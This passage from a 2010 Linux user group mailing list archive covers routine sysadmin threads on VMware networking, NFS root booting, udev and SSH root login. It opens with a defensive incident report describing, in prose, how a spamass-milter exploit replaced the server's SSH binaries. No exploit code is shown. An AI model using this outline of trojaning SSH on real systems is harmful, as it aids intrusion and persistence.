   2. It tried to add a unix group and user named "sshd"; the attempt
      failed, probably because there's already an sshd user and group
      on the system.

   3. It installed 32-bit Linux executables in place of /usr/bin/ssh
      and /usr/sbin/sshd. The new executables were dynamically linked
      against a small number of libraries, but most of the supporting
      libraries had been compiled directly into the applications.

   4. It installed a minimal /etc/ssh/sshd_config and an empty
      /etc/ssh/ssh_config.

   5. After verifying that sshd was in the process table, it
      removed the /xS directory.

   6. It created an empty file name /dev/devno

   7. It restarted sshd using /sbin/service

Again, this was all done under the spamass_milter_t security context.

I don't know enough about the sendmail <-> spamass-milter <-> spamd 
pipeline to have a definitive idea about what application misparsed 
the piped e-mail addresses and executed them.

I saw the attack again this morning, but by then I'd cleaned things up 
and gotten SELinux back into Enforcing mode, which prevented the 
exploit from working again.

Hey Paul,

You can usually fall back on reading security mailing list archives to
get the real scoop on this stuff.  In fact, I *strongly* recommend
anyone running public services like this to be on at least one or two
advisory lists, like bugtraq or full-disclosure.  The first public
info on this, that I know of, came as a proof of concept exploit over
a week ago:
  http://seclists.org/fulldisclosure/2010/Mar/140

More info posted yesterday:
  http://seclists.org/fulldisclosure/2010/Mar/264

I hope by "clean things up" you mean you rebuilt your server from
clean media.  Once someone runs code on your box, you should never
assume you can fully shut them out again.  The linux kernel alone
seems to have a local root hole every week, let alone all of your
setuid binaries and racy root-priv cron jobs, etc.

Good luck,
tim

General use is probably the right characterization. I'll be trying out 
different distros. I'm also going to try running several virtually, at 
the same time, for the experience. One thing I want to try is to see if 
I can get an old copy of Win98 to run as a virtual machine and have 
access to the SCSI controller I'll put in the box so I can run the 
original software that came with my Epson Perfection 600 scanner. At one 
time it worked under SANE, but somewhere in the last year or two that 
model disappeared from the supported scanners list. The scanner on my 
all-in-one Brother printer has developed a line running the length of 
the scan, plus the 600 can handle legal size originals.

So, a test machine with occasional scanning, but no serious production work.

Next time I have the lid off I'll see what I can figure out. I might 
have some documentation from my sister, too. I know it has two slots, 
but don't know the top end limits. On the other hand, this box is a few 
years old, so I won't be putting a lot of re$ource$ into it.

No, I'm not familiar with that. I'll have to look into it.


Update: My wife had to visit Pacific Solutions to have another machine 
looked at, so she took my sister's old box with her. The tech installed 
a 1 GB stick along with the 256 MB stick. The machine seems to boot XP 
faster than before, which is what I expected. I will soon start loading 
Linux distros on it.

Thanks to all for your advice.

When you include the requirement of being able to run several VMs
simultaneously, you just added to your memory needs. Put in as much as you
possibly can.

About 512MB per VM is a good minimum for 98 or 2k.

How big, at what resolution, and will you be editing what you're 
scanning?  An 8.5x11 scan at 1200 dpi 24-bit color would be 385MB, 
where 200dpi greyscale would only be 10MB.

Wouldn't adding one stick total about 1.25GB?

>Processor: AMD Sempron 2400+, 1.6 GHz

One core at 1.6GHz and no hardware virtualization?  Maybe better to 
spend the second $36 on a CPU if the board will take it.

>Hard drive: 111 GB (can't see the make and model unless I take it out.

Probably nearly worn out from all the swapping it has had to do at 
256MB!  See also `cat /sys/bus/ide/devices/0.0/model` or 
`ls /dev/disk/by-id`.

I must confess that I was shocked that ustream recognized an external

Message-ID: <D2E8098D-A1D7-41B6-94DC-CACBAE5899C3@ridenbaugh.com>

Around Thanksgiving I picked up a notebook at Free Geek, outfitted  
with Ubuntu, for use by my brother in law in northern California. We  
also set up a wireless broadband system for the house. His computer  
literacy is very limited, but he just uses it mainly for web surfing,  
and for the last four months it has been working fine.

Yesterday, he started it up and seems to be blocked from going  
online. All the wireless and modem equipment seems to be operating as  
per normal, and the notebook is otherwise functioning okay.

I've tried a few basic checks to try to figure out what the problem  
is, but no luck. Firefox had the "work offline" box checked at one  
point, but we got it de-checked and it's still not connecting. (The  
error messages we get, when asking the browser to go to a URL, have  
been "server not found.")

BIL would not have *intentionally* made any changes to settings, but  
might have inadvertently done something - the computer's touch pad  
and even keyboard are very sensitive.

His ISP, AT&T, wants extortionate amounts of money to put someone on  
the line and work it through. (Apparently Linux isn't included in  
their basic support.)

Any suggestions?

How do you know his wireless is working OK? Some notebooks have physical
switches/sliders to turn the Wifi on and off.  Maybe he accidentally turned
it off. There are lots of other possible causes, but that one is easy to
check. The switch is sometimes accompanied by an Led indicating if the Wifi
is on.

His ISP, AT&T, wants extortionate amounts of money to put someone on

Any suggestions?

I have an old laptop with 256M.  Plain Jane Ubuntu is slow as molasses, 
but Xbuntu is quite zippy.

My feeling is that 1G ought to be plenty.

Message-ID: <86sk7y2om7.fsf@coulee.tdb.com>


Apologies for activist propaganda, particularly if you don't live or
work within the Portland city limits, but as members of the geek
community the rest of you I consider you part of the target
demographic:

  http://www.pdxcommunityfiber.com/2010/03/17/portland-attempts-world-record-to-get-google%E2%80%99s-attention/

We are trying to demonstrate the hunger in Portland of ordinary people
for fiber-to-the-home to Google (who may decide to build a test-bed
network here) and to the City Council (who may be convinced to help
get it built even if Google chooses somewhere else).

We have an awesome video of Ward Cunningham talking about why it's so
important:

  http://www.pdxcommunityfiber.com/2010/03/10/ward-cunningham-on-community-fiber/

We are encouraging any/all people to come to this event this Saturday
at 9am at NW Couch and Naito Parkway (Front Avenue) and help us
demonstrate that Portlanders want open-access 1Gbps fiber connections
to their homes and businesses.  I was not consulted about the
time-of-day, so don't blame me.

Tell your friends, family and neighbors.  Set your alarm clock.  Help
fiber-to-the premises happen in Portland.

Thanks!

Message-ID: <4BA1C57D.7010605@robertmarktech.com>

All,

I have used Clark Connect for about 8 years now and love it, for the 
simple fact that most times I don't even know it's there. The uptime on 
my server is currently 623 days. The version I have installed is from 
2005, CC 3.2.

I happened to wander out to the web and look for the latest version, as 
I'm thinking of implementing VPN. Low and behold, ClarkConnect is now 
Clear Foundation, with a ClearOS that replaces CC.

Does anyone have experience with ClearOS? Is it just CC with a new 
marketing scheme, but I can expect the same reliability? Are there other 
good Gateway/Firewall specific distros out there that compare well with 
CC, in case I need to change?

thanks,

For what it's worth, the Clear people were at LinuxCon and are reatlly
trying to get the word out. Also consider Linux SME (wiki.contribs.org)
and the Ubuntu-based www.ebox-platform.com

It is an outdoor event.  I think by showing up at that location and
looking for the group of milling people will tell you where exactly
you are going.  Probably about here:

  http://maps.google.com/maps?f=q&source=s_q&hl=en&geocode=&q=nw+couch+%26+naito+pkwy,+portland,+oregon&sll=37.0625,-95.677068&sspn=46.495626,89.560547&ie=UTF8&hq=&hnear=SW+Naito+Pkwy+%26+NW+Couch+St,+Portland,+Multnomah,+Oregon+97209&ll=45.523894,-122.670207&spn=0.001263,0.002733&t=h&z=19&layer=c&cbll=45.524003,-122.670196&panoid=9J7jdFGYsEMsRmbEO2pOyQ&cbp=12,123.54,,0,2.53

  http://xrl.us/bgy2fc

The general idea as I understand it is to have a game of "telephone"
where a message gets repeated from one person to the next through the
line.  The exact nature of what we do is not as important as having a
bunch of people doing it.  I think we're going to try to go across the
Steele Bridge to Pioneer Courthouse Square, but that will depend on
how many people show up.

I am interested in running a WinXP instance on top of Linux in a

concerned that hotplugged devices (USB in particular) might make "the

hearing about anyone's experience doing or trying to do this.  What

Message-ID: <4BA3B345.5030106@pacifier.com>

I am trying to use the designer tool in QT 4. I have a basic little 
window with a menu bar. I want to create some pop-up windows that are 
generated by clicking on items in my menu bar.

Using QT 3 and C++, I could easily do this. Can anyone give me the big 
picture type stuff as to how one does this with the QT designer?

For example, do I create another window using the designer and then in 
my main window constructor connect the clicked() slot in the menu bar to 
to a main window slot that builds the new window? This would seem like 
the reasonable way to do this, but I'm not sure how.

I have to go out of town this afternoon (10-03-19) so if anyone asks any 
questions of me, it may be tomorrow morning before I can answer.

Hi Russell,

Not sure if you're using a libvirt-managed KVM instance. These links
seem to indicate that KVM can autoconnect USB passthrough, but libvirt
doesn't yet. The second blog post shows a workaround that may
asymptotically approach your desired maximal transparency.

to point to a particular web page while a second pointer would point to
a second web page - each page having a different domain name.  EasyDNS
says that this can be done on the webserver.

I think you would be much better served starting with google on this. There
is a plethora of documentation on this subject and if you're going to start
down this road, it is very important for you to start learning how to find
it.

"apache multiple domains" (without quotes) would be an excellent starting
search.

Read up on virtual hosting in the apache documentation.
It is pretty simple once you get the hang of it.

Well, then there's that.  Too.
But if I can figure it out, then . . .

Anyway, here's a good starting point:

HI

Can you tell me what version of Apache you are running??

type     httpd -v on the command line..  <terminal>

For  different versions of Apache it is different..

And the documentation can be confusing..

Yes, the famous PLUG Clinic is this Sunday, March 21, at Free Geek, 1-5
PM!

Bring your computer with its pathetic non-Linux operating system and
we'll upgrade it to Linux. If you have problems with your Linux
computer, bring it and we'll figure it out. Or just come and look over
people's shoulders to see what Linux is all about.

There will be coffee and probably cookies and other geek food. And
there will definitely be lots of open source gem?tlichkeit.

Subject: [PLUG] Hand-held Computers For Data Acquisition
Message-ID: <alpine.LNX.2.00.1003200803560.18875@salmo.appl-ecosys.com>

   While meeting with one of my clients this past week I identified a need
for automating data acquisition in a gold mine mill. This is a harsh, dirty,
noisy environment, but every shift has compliance monitoring requirements
for several regulatory permits.

   Now the mill workers enter values on paper forms and carry them to the
environmental office where an environmental tech (with a Masters degree)
spends too much time keyboarding the hand-written data into the spreadsheet
they're current using (replacing that 'storage' system is what we're doing
for them). One page is legal size and jammed with boxes for
measurement/observations; other pages are letter size. The entire work flow
is highly inefficient and error prone.

   I offered to provide my client with options to automate the data
collection using tablet computers or, preferably, hand-helds that are
ruggardized and sealed for use in industrial environments. I think that
entering data via keys would be better than entering by stylus because it
eliminates the unable-to-interpret problem of scrawled numbers.

   My perception of the tool is that these units would run linux, use SQLite
as the back end, and have a simple app (python, ruby, whatever) that
presents the measurements to be made, one-by-one in a yet-to-be-determined
sequence, and allows the worker to key in the values (numbers or text as
appropriate). The computers would then be carried to the environmental
office where the data would be transferred to our permit compliance
management system, or there could be docking stations in the mill. This
system could also be expanded to water and air quality monitoring at various
mine sites (out-of-doors) where the wells, streams, and other sampling sites
are not instrumented. (It's difficult to instrument sites that are under
10-15 feet of snow at 6,500+ feet elevation.) There is also the potential to
expand this type of automation to other aspects of the mine such as
operations and maintenance, safety, and security. The company is very open
to automating what makes sense as a way for employees to be more productive
and to reduce errors.

   So, if you're interested in doing this hardware/software project as part of
your business, please contact me off the list. This would be _your_ business
opportunity, and our only involvement would be introducing you to our client
and ensuring the integration of data transfer with our system.

   You'll also get the opportunity to visit beautiful Elko, NV, and the
mine/mill site 50 miles to the northwest. :-) I'll provide hotel and
restaurant recommendations.

Surely this isn't an unusual error?  I did a series of upgrades on my
CentOS system and presto, this error pops up like clockwork.  I'm on
give up right now and I'm downloading Fedora 12.  If anyone
knows what is going on with this error, I'd like to know how I can 
fix the problem.

Subject: [PLUG] Vmware 2 with Ubuntu 9.1
Message-ID: <4BA6CDBB.2030109@robertmarktech.com>

All,

Is anyone running ubuntu 9.1 as a vmware host? I'm noticing in my test 
environment that I can't ping or ssh to any of my NAT machines. I have 
routes to the correct vmnet interface, but for some reason all the 
packets get lost.

vmnet3 on the host is configured as 192.168.0.1
guest is 192.168.0.134

host route shows:
192.168.0.0   *   255.255.255.0   U   0   0    0 vmnet3

guest route shows:
192.168.0.0   *   255.255.255.0   U   0   0    0 eth0
default   192.168.0.2   0.0.0.0     UG   0   0   0 eth0

my guest can ping 192.168.0.2 without problems, but can't ping 
192.168.0.1. Both ip addresses are the host machine.

The host machine can ping 192.168.0.1, but not 192.168.0.2.

I can ssh from the guest into the host, although I can't go in the 
reverse direction.

I'm guessing there's something missing in the routing table, but I 
compared the route outputs on my Ubuntu 8.1 Vmware server 2 hosts and 
they appear the same. Does anyone have any idea where I can begin 
looking to find the cause?

thanks,
Dan H.

So I did some further testing. I get the same problem with host only 
networking as I do with nat. Bridged networking seems to work fine 
though. The guest OS gets an ip on my House LAN (yeah wireless 
bridging!) and I can get to it from any machine.

Does anyone know how Vmware handles it's nat? There's a config file 
under /etc/vmware/vmnet3/nat but it appears exactly the same as the one 
on my clone.

Did Ubuntu 9.1 include any default changes with firewall settings or tcp 
wrappers? I don't have any entries in /etc/hosts.allow or hosts.deny, so 
I'm assuming tcp wrappers isn't enabled. I can't see any settings for 
firewalls under administration, so I'm also assuming that nothing new 
was added there.

/bin/hostname is the magic on my RHEL box should be similar in Fedora
I would assume.

Or edit the file "/etc/sysconfig/network".

This will require either a restart of the network (service network 
restart) or a reboot.

/bin/hostname $HOSTNAME is not sticky.  When you reboot it will be back 
to what is was originally.  I don't see anything GUI-wise as a normal 
user.  So if you've haven't made the PAM/LOGIN changes to allow root to 
do GUI you'll have to su/sudo to root in a terminal to make the change.

I have Dirk Dashing 1.03 and Rick Rocket where neither game has sound.
I'm assuming the problem is the same.  I had sound in CentOS 5, of
course CentOS 5 is way behind Fedora.

For those with the ATI HD 3450 video card by the way, use the
experimental mesa driver.

No redhat/fedora here but I can google +fedora +hostname +permanent.

Does anyone know why Vmware Player 2.5.3 bombs out on Fedora 12 trying
to compile virtual ethernet support?  Another thing, is Workstation 7
really $135+?  I thought I had 6 on CD or DVD but I can't find it.
Thought I would just ignore that problem and buy 7.  Maybe not.

Could very well be the iptables firewall. I forget if it's on by default in
Karmic, but a "iptables -L" (as root) should tell you if it's doing
anything.

Yes, FC12 recently upgraded its kernel and dropped some old deprecated API
in the process. Try a newer Player, I have 3.0.1 build 227600 here (it's the
one that comes with Workstation 7.0.1, I assume they have the same build
online). It compiles fine.

I am finding that Dirk Dashing 1.03, yeah this is old, doesn't save on
Fedora 12.  I can save a game, but that save only persists till I exit
the program.  I'm sure this is an SELinux or some such feature.  Is
there a work around?  I have already disabled SE Linux.

I would install a newer version of Dirk Dashing, but I only have the
version backed up that I bought originally.  Over time I was allowed
temporary access to download newer versions, but I have not kept the
newer releases.

Subject: [PLUG] .forward file, 644 not 664
Message-ID: <20100323042231.GB8471@gate.kl-ic.com>

I just spent a couple of aggravating hours trying to figure out why
a ~/.forward file was not working for a business associate on my
mail server (which uses sendmail).  

The user's .forward file must be 644 (not 664), that is rw-r--r-- .
Not group writable.  If sendmail doesn't like the permissions on
the .forward file, it silently ignores it, leaving nothing in the
log file.  That is stupid behavior;  log files should indicate
error conditions, not just success.  

This is referred to only cryptically in some of the documentation
I found, referring only to a "safe" forward file.  A debug
nightmare, until I started frobbing permissions.

I added a # comment to the fellow's .forward file about the
required permission.

So, check all user's .forward files to make sure they are 644.
The users themselves get to write to these files, but don't
necessarily know how to set them up.

Sendmail can be told to log more to syslogd using the -Oflag or in the 
sendmail configuration using the confLOG_LEVEL define, to increase the 
LogLevel above the default level of 9.

1. Change the hostname in /etc/sysconfig/network
2. Generally it's good to make sure the hostname is in /etc/hosts
3. Make the changes take affect, either reboot (easiest way if you're
logged in remotely), restart networking (simple if it's a local box) or
using the hostname command.  Rebooting is however the safest option,
some stuff such as X-windows doesn't like the hostname changing while
it's running.

What OS is the guest?
What is the network IP for your house?
What is the network IP for your VMWare guests behind the NAT?

It looks like the WAN and LAN side of the VMWare NAT share the same IP
space, specifically 192.168.0.x, which would confuse the routing
either on the host or the VMWare virtual router.

Just an FYI, the Ubuntu version is 9.10, with the trailing 0.  It's to
be read similar to a date like 2009.10 or October 2009. To read it as
the number 9.1 would be similar to reading today's date as the number
1984 (=2010-03-23) or 6.48929267 ? 10-5 (=03/23/2010).

In using Open SSH to a linux box, I get the user directory.  I can move
up to the root but cannot transfer files or work.  How do I become the
root user.

this will give you a root shell
su -

or just su which won't be a login shell which is fine if you don't
need all root's env vars and such

or sudo $command ?

I don't know if I'd suggest ssh'ing to the box -as- root. That seems like a
bad idea. su - or sudo should do it...

depends.  if he's really trying to 'transfer files' as he said,
there's no way to su inside of sftp/scp.

Hi

In general it is a BAD idea to ssh as root..

/etc/ssh/sshd_config should have this  set to NO..

Once on the box  ..Then su to root and do your work..


YMMV

Good point..but maybe copy the files to a less secure location and then scp
as user?

You may not be able to log in as root directly from ssh.  Many sysadmins
prevent root from logging in as a security measure.  Just copy the files
to your directory and then use "su -" or "sudo su -" to become the root
user and copy them or unzip them to whereever.

Oh, and the option is:
   PermitRootLogin (yes|no)
in /etc/ssh/sshd_config

What I always do in this case is..

scp file.txt  user at user.com:/tmp

Then after the file has been copied..

I ssh into the box..  su to root.....move the file where it needs to
be.. With name and permissions set...........  Or some variation on
that..


YMMV

The guest OS is CentOS 5.

The House network (VMware Bridged) is 192.168.2.0
The VMware Nat network is 192.168.0.0
The VMware HostOnly network is 192.168.190.0

>   
The House network is running on a completely separate subnet. I have a 
clone of the guest running in the same NAT network on an Ubuntu 8.10 
host without problems. I installed Ubuntu 9.10 on test machine, 
installed VMware 2.0, then copied the guest over. I made sure to create 
the same NAT network on the Ubuntu 9.10, 192.168.0.0, and booted the 
cloned guest (CentOS 5). On Ubuntu 8.10 I can ssh from the host to the 
guest no problems.

So, either the vanilla config in Ubuntu 9.10 broke the ability to ssh to 
a VMWare guest, or VMware 2.0 networking is broken on Ubuntu 9.10. I'm 
leaning towards VMware having done something, as you already have to 
patch the install to get it to work. What I'm not sure of is how VMware 
runs the NAT between the hosts IP and the guests IP. There is no bridge 
created, and the routing table looks exactly the same as Ubuntu 8.10 
except for a link-local entry in Ubuntu 9.10. I suspect the problem lies 
in the vmnet-natd, that it's not picking up any traffic into the NAT 
network.

I'm not enough of a network guy to make sure it's not something in 
Ubuntu's 9.10 network config. That's what I'd like to verify if possible.

Alternatively, there's the forced-commands-only option:

   PermitRootLogin forced-commands-only

In /root/.ssh/authorized_keys, you'd limit the command (and, 
optionally, the client host) that can be run with that key, e.g.,

from="trusted.yourdom.com",command="/bin/ls" ssh-rsa AAAA....

The trick is that doing scp that way is hard. rsync is easier to 
configure as a forced command:

scp can be sort of a pain. but I must say--when you get it figured out
you'll feel extra geeky and use it far more than you'd think you would!  I
love ssh/scp/wget! :D

We are out of speakers for the PLUG general meetings.

Next month's PLUG meeting is April 1, 2010.
Does anyone want to speak?
Or, does anyone know of someone I should contact?

We need speakers for months after that as well.

Subject: [PLUG] NFS trouble...
Message-ID: <1269379369.2053.4.camel@localhost>

I can mount /nfsroot/LFSPIII from Fedora 12 running locally, but I can't
NFS root mount it.  I get a can't figure out port for nfsd and mountd
error.  Why I can't get the port from a PXE boot but there is no problem
whatsoever from a normal local boot is beyond me.

I have tried googling for this problem, no dice.

I have tried dumping the iptables firewall on the server, no dice.

I have tried adding to /etc/hosts.allow, didn't help.

I am wondering if something like:

nfsd:	192.168.5.

really works as intended?

In anticipation of the immediate next question, "no".

Like I said before, I can NFS root mount from Fedora 12 installed
locally no problem.  For some reason, when I try to do an NFS root boot
the server doesn't exist.  I'm beginning to wonder if IP
autoconfiguration is not happening or something similar.

Can you pxe boot something like DSL and get the proper network info?

Also does the kernel have autoconfig turned on?  It took me about six
different kernel builds before
I got my 2.4 kernels working.  Also a initrd that has busybox in it
with an escape as init=/bin/sh, helps in troubleshooting
these problems.  I had to build my own initrd for nfs root boot.

Hi...

I have this new computer and Fedora 12...

Just tried to use my camera...

The computer/OS does not recognize it....

I used to plugging it in and having the box/OS recognize it..

NOT so..

Where do I start looking?

Execute the following command on the command line and post the results
of /tmp/dmesg.txt:

  dmesg > /tmp/dmesg.txt

Also, have a look (and post) /var/log/messages.

From this we can get a good start. Does the USB subsystem recognize a
device was added? Does your new system have the necessary modules
installed? Do we simply need to mount the camera's mass storage?

Best,


-Cooper

I'd start with the log files.

as root:
    tail -f /var/log/messages

Then plug the camera in and turn it on and see what you get.

Hi Marvin,

The good news: your system is seeing the new device and is trying to
assign it as a mass storage device, as it should.

The bad news (as you've no doubt surmised): the device is kicked off the
bus.

A poster submitted a similar question here
<http://www.linuxquestions.org/questions/linux-hardware-18/mounting-a-usb-hdd-370812/>.
This poster's condition doesn't exactly replicate your post but it's a
reasonable start as your system's USB detection stack is basically
intact. In that case, the system was using USB 1.0 by default, your
computer's trouble may be similar.

Perform the following as root and re-plug in the device:

  modprobe ehci_hcd

If that doesn't work--and I offer a caution if you have a USB keyboard
and/or mouse--try the following:

   rmmod ohci_hcd
   modprobe ehci_hcd

Also, make sure your cable is rated USB 2.0. I have seen instances where
high-speed USB drives failed to associate correctly as the cable was
rated only to the 1.0 standard.


Best,


-Cooper

Hi Marvin,

I'm inclined to think that this is a USB module issue as I indicated in
my last post. On the old box, let's see what what USB modules you've
installed and compare with the new box.

If possible, post the following command from both machines as root:

  lsmod


Best,


-Cooper

Hi Marvin,

A little more research tells me that your system's BIOS may be set to

similar.

Details here:

You are guessing correctly, sir.

I had a registration on VMware's site for Workstation 6 and it cost me
$99. Without upgrade pricing, VMware sells a download for $189. As far
as Workstation 7 on Fedora 12 goes, it works perfectly for me without
any patches or workarounds. Player 3.0 works fine as well, except that
there is a workaround required: Player crashes after three seconds or
so and the workaround causes problems with downloading VMware Tools
Also, Player 3.0.x has the ability to create VMs.

You will need kernel-devel or kernel-PAE-devel. Install the one that
matches your currently installed kernel. You may also need
kernel-headers. I've never tried installing just one or the other.

Another thought would be to get vmware server, which is also free.

Have you tried running a packet sniffer to be sure? Sniff on vmnet3 on
your host machine, and on eth0 on your guest.

192.168.0.2 is *not* your host machine. See the comment below about
how VMware's NAT networks work for an explanation.
It would help if there was a complete listing of what systems can ping
what other systems. Being able to ping 192.168.0.1 from your host
machine indicates that the interface is working properly as an
interface. The fact that you can't ping 192.168.0.2 is suspicious, but
not useful on its own to diagnose the problem. Can your host ping your
guest? I'd make sure that firewalls on both systems are allowing ICMP
ECHO traffic through. Often times, when one system can ping another
but not vice versa, it's a firewall on the system that doesn't
respond.

This too sounds like a firewall issue. Check the guest's firewall to
see if it's blocking port 22.

Your routing tables are fine. If it was a routing issue, your wouldn't
be able to SSH in either direction as the host wouldn't know where to
send replies.

So I understand you have two separate physical hosts each with
essentially the same exact guest OS. One host is Ubuntu 8.10, the
other is Ubuntu 9.10. The Ubuntu 8.10 functions to your expectations,
and the odd behavior is occurring on the Ubuntu 9.10 machine. Is this
correct?

Essentially, VMware creates a virtual network. Any system with a
virtual network adapter on that network will interact with other such
systems as if they were attached to the same Ethernet network, except
that rather than handle everything over cables, it's happening in
memory on the host system. Your host system is connected to the
network using your vmnet3 adapter as 192.168.0.1. The NAT gateway is
192.168.0.2. In addition, If a system is set to use this as its
default gateway, the packets will be NATed like any other NAT gateway
and sent our your system's physical port (or antenna). Under default
settings, whey your guest systems turn on they use DHCP to request IP
information. VMware sends the information to the systems including
using 192.168.0.2 as the default gateway.

A lot of what you've described sounds like it could be a firewall
issue, though some things, like not being able to ping 192.168.0.2
from your host, are suspicious of a problem with the virtual network.
To figure out what the problem is, start by disabling any firewalls
you have on both systems. Also, disable SELinux on both systems. Then
try to ping from host to guest, then from guest to host. If you can
ping in both directions, things should work. Try to SSH. If it works,
then it's a problem with a firewall or SE Linux. If you can only ping
in one direction (host to guest or guest to host) but not the other,
you probably still have a firewall or instance of SELinux enabled. If
nothing works, it's probably a problem with VMware. Nothing working is
unlikely as disabling firewalls and SELinux wouldn't cause SSH to
suddenly stop working from guest to host.

Hope this helps,

I haven't tried it on Fedora 12, but I'd check out the vmware forums 
first. VMware server 2 is having issues on Ubuntu with networking. Other 
people have seen the same problem, and I don't know if there be a fix soon.

No, the host can't ping the guest. There are no firewalls between the 
two. No firewalls anywhere, never set one up as NAT protects the network 
from interfering with the outside world. The guest is a default CentOS5 
that works fine on Ubuntu 8.10. I disable firewall during the install 
when it asks.

I agree, but unless Ubuntu 9.10 is doing something funny with a firewall 
somewhere, I don't see why that would be it. The other suspicious thing 
is I can put the guest on bridged and ssh works fine. So there can't be 
a firewall on the guest, though it does not eliminate a firewall on the 
host. (Though I can ssh into that box from other machines, but the 
firewall could be network specific).

OK, so this tells me VMware could have broken something from the host 
going from its own adapter (192.168.2.25) to the Virtual Gateway 
(192.168.0.1). I'll have to do the packet sniffing to be sure, but I 
suspect they're not routing properly in memory there.

No SELinux, no firewalls, no tcp wrappers. It's a very simple setup, and 
I've always stayed away from those because they over complicate my life. 
At the end of the day this is a test domain with AD+DNS, Oracle, Web 
App, and AutoSys Scheduler virtual machines. Since it's running AD and 
DNS, I don't want it outside it's sandbox. That's why everything get's 
NAT'd, it's all I need.

I posted this (http://communities.vmware.com/thread/252883?tstart=0) on 
VMware's forums and someone else responded they were seeing the same 
thing. It gives me more confidence the problem doesn't like between the 
chair and keyboard.

I'm on Fedora 12 and have noticed the crashes in 3 seconds problem.
What is the workaround?

As far as VirtualBox goes, yes that is an alternative if you aren't
locked into vmware.

Well, I have gotten memtest86+-4.00.bin.gz to network boot via PXE.

Here are simple instructions that don't seem to be available via google:

1)  Use gunzip to decompress the binary.

2)  Rename the binary to just memtest86, pxelinux can't handle .bin.

3)  Configure the pxelinux menu to load memtest86.

I'm still stumped as to why pxelinux starts my Linux From Scratch
kernel okay and then crashes at the determine RPC port number step.
The kernel behaves as if the NFS server isn't there, which isn't
the case at all.  I can mount the share in question via Fedora 12
installed natively, I just can't get the share to mount via 
pxelinux.  I do not want to CD boot, hard drive boot, floppy
boot, or USB boot as doing so would defeat what I'm after.  I'm
beginning to think that an initrd is required, but that shouldn't
be required at all.  Is it enough to have NFS root compiled in
and the nic driver compiled in or does ext4 support need to be
compiled in as well?

How would I modify my Linux From Scratch system so that NFS root
boots and a local boot will work properly?

Does the NFS root have to be in a subdirectory of the tftp-server 
root or can it be anywhere on the server?  Most instructions
seem to mix the directory for NFS root and the tftp server 
together.

What you have compiled in depends on what you want to accomplish prior
to starting user space.
You have to have network autoconfig built in.
You have to have network block device built in.
You should need other file systems built in.

Built an initial ramfs file with a static busybox in it.  This should
be just a cpio that is compressed.
No filesystem.  Make a directory tree and populate it.  Then cpio and
compress it.

Doesn't need to be but having both in the same tree sometimes makes
things easier.

NFS client is compiled in and NFS root is selected.  The nic driver is
compiled in.  Why do I need network block device support?  Isn't that
different than NFS?  Why would I be getting a can't find NFS server
error if not compiling in anything but NFS for filesystems is the
problem?

I went to the Fedora 12 list and was looking for the modules..

Was told they were compiled in Kernel and there is a bug..

Thanks

is the APPEND line just one line?  missing a \?
--ip=::::::dhcp?
I use 'ip=dhcp' and IPAPPEND 2 before the APPEND line.

Subject: [PLUG] Open Source Bridge CfP ends March 29.
Message-ID: <4BACE39D.6050304@zenlinux.com>

Hi all,

I haven't seen anything mentioned here on the ML about the Open Source 
Bridge conference, so I wanted to post a short announcement.

Open Source Bridge is a conference for developers working with open 
source technologies. It will take place June 1?4, 2010, in Portland, 
Oregon, with five tracks connecting people across projects, languages 
and experience to explore how we do our work and why we participate in 
open source. The conference structure is designed to provide developers 
with an opportunity to learn from people they might not connect with at 
other events. Attendees will learn and interact at three days of 
traditional conference presentations, a day of free-form unconference 
sessions, and our 24-hour Hacker Lounge.

This year we are thrilled to have an excellent downtown location at the 
Portland Art Museum, an extra day packed full of open source goodness, 
and an on-site 24-hour Hacker Lounge! As a user group member, you can 
use the coupon code ?osbugluv? to register for only $200 when you select 
either an Early Bird Registration (through April 1st), or a Regular 
Registration (after April 1st).

Also, the Call for Proposals ends on March 29th, so if you'd like to 
give a talk, please submit something immediately:

http://opensourcebridge.org/events/2010/proposals

To register for the conference or learn more, visit

http://opensourcebridge.org

On a personal note, I attended this conference last year and was really 
inspired by it. I think it offers one of the best values in terms of low 
registration costs and attracts some really high quality presentations.

Scott

Do they cover much open-source embedded development, or is it all 
desktop/server stuff?

I'm about to revive a deeply embedded ARM project that I last worked on 
before I defenestrated my PC, it'd be nice to talk to folks who've 
actually done cross-development from a Linux host.

One of the neat things about this conference is that the proposal system 
is completely open. You can browse through the submitted talks and add 
your comments here:

http://opensourcebridge.org/events/2010/proposals

These proposals look to have some component of embedded systems in their 
descriptions:

http://opensourcebridge.org/proposals/403

http://opensourcebridge.org/proposals/390

The latter one is going to be quite similar to the talk I gave at PLUG 
AT last month.

I'm sure you'll find some of us there. In fact, I'm starting to 
brainstorm possible activities for the 24-hour hacker lounge that might 
involve embedded projects - if you have any suggestions, ping me off-list.

This is driving me crazy.  I install Ubuntu Server on a portable drive
at home.  Fire it up on a wired network and check ifconfig.  It
dutifully gives me the internal ip address from my router and is able to
access the internet.  I then dutifully reboot the machine turning it off
after everything is killed but before the reboot starts.

The scene changes to my office where I turn on a different machine with
no drives but the portable drive on the USB port.  Ubuntu server boots
up and works just fine until I sudo ifconfig.  The internal loop shows
127.0.0.0 shows but the wired network ip address does not.
Init.d/networking restart gets an eth0 no such device message.

Ubuntu LiveCd on the office machine get the network and internet just
fine.

Any thoughts or help would be appreciated or even a large hammer would
be appreciated.

Does ifconfig -a show a different ethernet interface?  Sometimes udev
rules map ethernet macaddrs to specific interface names, and if a
non-match is found, then the new macaddr gets a new interface name
(eth1, eth2, etc).  In debian-land, the culprit is:

  /etc/udev/rules.d/70-persistent-net.rules
 
... and yes, this is slightly crazy in many contexts.  It really only
is well adapted for situations when you are using the box as a router
and want to make sure the "inside" and "outside" remain distinct.

Hi Scott,

I feel your pain, and have run into this before moving a CF disk between 
different embedded devices.

The problem is with udev. When your Linux system boots, the udev 
subsystem enumerates your hardware and sets up some dynamic rules files. 
What it's doing is noticing that the MAC address of your ethernet device 
has changed, and rather than overwriting it, it is creating a new ethX 
device. Your networking scripts, on the other hand, are trying to bring 
up eth0 specifically.

Look in your /etc/udev/rules.d/ directory for a file named 
"persistent-net.rules" or thereabouts. If inside that file you see 
entries for multiple ethernet interfaces (e.g, eth0, eth1, eth2, etc), 
and you only have one wired NIC in each of your machines, then you have 
confirmed that this is the source of the problem.

The solution I've used (which may not be the Right Way to do it) is to 
delete this rules file and reboot. The file will get regenerated again 
and will use your current NIC as eth0 again.

If you're only moving this disk between two different computers, you 
could also go ahead and create a DHCP connection for eth1. However, if 
you're moving the disk between N computers, the deletion route is 
probably simpler.

Let me know if this works for you.

Scott

Subject: [PLUG] 2nd Router Setup
Message-ID: <4BAE7110.1010400@comcast.net>

I have had a Netgear RT-314 router connected to my Comcast cable modem 
